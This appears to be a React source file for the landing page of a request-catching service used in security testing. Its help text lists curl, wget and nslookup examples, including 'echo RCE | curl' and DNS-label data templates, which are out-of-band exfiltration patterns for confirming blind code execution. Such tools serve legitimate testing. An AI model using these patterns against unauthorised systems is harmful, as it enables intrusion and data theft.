import React, { Component } from "react";
import { RequestInfo } from "./request-info";
import AceEditor from "react-ace";
import { Utils } from "../utils";

export class RequestsPage extends Component {
  constructor(props) {
    super(props);
    this.state = { ...props };
  }

  render() {
    let content = `from requestrepo import Requestrepo # pip install requestrepo

client = Requestrepo(token="${localStorage.getItem("token")}")

print(client.subdomain) # ${this.props.user.subdomain}
print(client.domain) # ${this.props.user.subdomain}.${this.props.user.domain}

client.update_response(raw=b"hello world")

# Get the latest request (blocks until one is received)
new_request = client.get_request()
print("Latest Request:", new_request)`;
    return (
      <div className="card card-w-title card-body">
        {this.props.user !== null &&
          this.props.user !== undefined &&
          this.props.user.requests[this.props.user.selectedRequest] ===
            undefined && (
            <div className="grid">
              <div className="col-12">
                <h1>Awaiting requests</h1>
                <p>How to make a request:</p>
                <code>curl http://{this.props.user.url}</code>
                <br />
                <br />
                <code>
                  curl http://{this.props.user.domain}/
                  {this.props.user.subdomain}/
                </code>
                <br />
                <br />
                <code>
                  curl -X POST --data hello http://{this.props.user.url}
                </code>
                <br />
                <br />
                <code>nslookup your.data.here.{this.props.user.url}</code>
                <br />
                <br />
                <code>echo RCE | curl -d @- {this.props.user.url}</code>
                <br />
                <br />
                <code>
                  wget --post-data "$(echo RCE)" -O- {this.props.user.url}
                </code>
                <br />
                <br />
                <p>
                  Check out the Response tab to edit your HTTP Response or the
                  DNS tab to add DNS records for this subdomain.
                </p>
                <p>
                  Automate requests/responses using the{" "}
                  <a
                    href="https://github.com/adrgs/requestrepo-lib"
                    target="_blank"
                    rel="noreferrer"
                  >
                    requestrepo
                  </a>{" "}
                  Python library:
                </p>
                <AceEditor
                  placeholder=""
                  mode="python"
                  theme={Utils.getTheme() === "dark" ? "monokai" : "xcode"}
                  fontSize={14}
                  showPrintMargin={true}
                  showGutter={true}
                  highlightActiveLine={true}
                  width={"50%"}
                  height={"250px"}
                  style={{ border: "1px solid black" }}
                  value={content}
                  setOptions={{
                    enableBasicAutocompletion: true,
                    enableLiveAutocompletion: true,
                    enableMultiselect: true,
                    enableSnippets: true,
                    showLineNumbers: true,
                    tabSize: 2,
                  }}
                />
              </div>
            </div>
          )}
        {this.props.user !== null &&
          this.props.user !== undefined &&
          this.props.user.requests[this.props.user.selectedRequest] !==
            undefined && (
            <RequestInfo
              request={
                this.props.user.requests[this.props.user.selectedRequest]
              }
            />
          )}
      </div>
    );
  }
}
